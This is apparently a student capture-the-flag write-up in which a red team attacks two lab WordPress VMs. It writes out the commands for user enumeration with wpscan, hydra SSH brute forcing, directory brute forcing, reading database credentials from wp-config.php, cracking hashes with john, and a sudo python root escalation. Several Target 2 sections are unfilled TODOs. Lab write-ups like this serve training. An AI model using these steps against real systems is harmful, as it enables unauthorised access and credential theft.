# WordPressRedTeam_BlueTeam

The network depicted below was used to test exploits and determine vulnerabilities within the WordPress servers.
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Final%20Proj%20Topology%20(Updated).png)
Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

# Exposed Services

The nmap scan outlined below identifies the potential points of entry:

nmap $ nmap -sC -sV 192.168.1.110

Target 1:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/nmap%20vm1.png)

nmap $ nmap -sC -sV 192.168.1.115

Target 2:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/NMAP%20final%20Project.png)

# Critical Vulnerabilities

The following vulnerabilities were identified on each target:

Target 1
- CVE-2019-12215 Full Path Disclosure (192.268.1.110/var/www/html/vendor)
- CVE-2019-15653 html password disclosure - The password hash is viewable in plaintext (192.168.1.110/service.html)
- Wpscan exposed username which allowed brute force of password information.  User access to the wp-config.php file via nano.  This exposed the root user and password.

Target 2
- CVE-2019-12215 Full Path Disclosure (192.168.1.115/vendor/PATH)
- CVE-2015-8476 Php mailer (192.168.1.115/vendor/PHPMailerAutoload.php)

# Exploitation

The Red Team was able to penetrate both Target 1 and Target 2 and retrieve the following confidential data:

Target 1

Before we began, we ran an enumeration scan to uncover the users and hidden directories within the Target.  
- Command used: wpscan --url http://192.168.1.110/wordpress --wp-content-dir -at -eu 
- This command uncovered user names steven and michael.  
   ![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM1%20wpscan%20michael.png)

- Once I obtained the usernames I was able to run a hydra command to obtain the password.  As noted above, port 22 is open so I wanted to obtain the password that could be used to SSH into the machine.
- Command used: hydra -l michael -P /usr/share/john/password.lst -vV 22:192.168.1.110
- This command exposed "michael" as the password for the username "michael".  Utilizing ssh michael@192.168.1.110 with password "michael" I was able to gain access to Target 1.  
   
- flag1.txt: 9bbcb33e11b80be759c4e844862482
   - dirbuster was used to uncover the file path that led to the flag exposure.  http://192.168.1.110/service.html.  Utilizing inspector it was uncovered the flag was exposed in plain text.
   - dirbuster command: dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://192.168.1.110
   
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/flag%201%20vm1.png)
     
- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
   - gobuster exposed directory path (flag was discovered at 192.168.1.110/vendor/PATH)
   - gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.110 
   
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/gobuster%20vm1.png)
     
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/VM2%20Index_Vendor.png)
     
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/dirbuster%20path%20to%20flag2.png)    
     
- flag3.txt: afc01ab56b50591e7dccf93122770cd2
  - I was able to expose the username and password for the MySQL database once I discovered I had access to the wp-config.php file while logged in as michael.
  
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/nano%20wp-config.png) 
    
![TODO:](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Find%20IP%20for%20mysql.png) 
    
- command: mysql -u root -p wordpress   
- Once I entered this command it prompted me to enter my password.  Using the root password above I was able to login to the mysql database.  
- From there I searched through the tables to see if I found anything interesting.  I found what I was looking for by running the following commands:
  - -> show databases; -> use wordpress -> show tables; -> select * from wp_posts
  - Flag 3 was exposed with this step.  

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Flag%203.png)

- flag4.txt: 715dea6c055b9fe3337544932f2941ce
  - I used the following commands to expose flag 4:
  ->show tables; -> select * from wp_users; -> 
  
  ![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/wp%20users%20steven%20VM1.png)
  
   - john hash.txt to translate steven’s hash into password “pink84” -> logged in with steven’s credentials and then ran bin/bash command  to gain root
   - ssh steven@192.168.1.110 -> sudo /usr/bin/python -> import os -> os.system(‘ /bin/bash’) -> ls -> cat flag4.txt

Target 2
- flag1.txt: a2c1f66d2b8051bd3a5874b5b6e43e21
 - Exploit Used 
   ![TODO:](html) gobuster - exposed directory path (flag was discovered at 192.168.1.115/vendor/PATH)
   ![TODO:](html) gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115
- flag2.txt: 
 - Exploit Used
   ![TODO:](html) Identify the exploit used.
   ![TODO:](html) Include the command run.
- flag3.txt:  a0f568aa9de277887f377887f37730d71520d9b
 - Exploit Used
   ![TODO:](html) dirbuster - exposed directory path (flag was discovered at 192.168.1.115/wordpress/wp-content/uploads/2018/11/)
   ![TODO:](html) dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://192.168.1.115
- flag4.txt: 
 - Exploit Used
   ![TODO:](html) Identify the exploit used.
   ![TODO:](html) Include the command run.

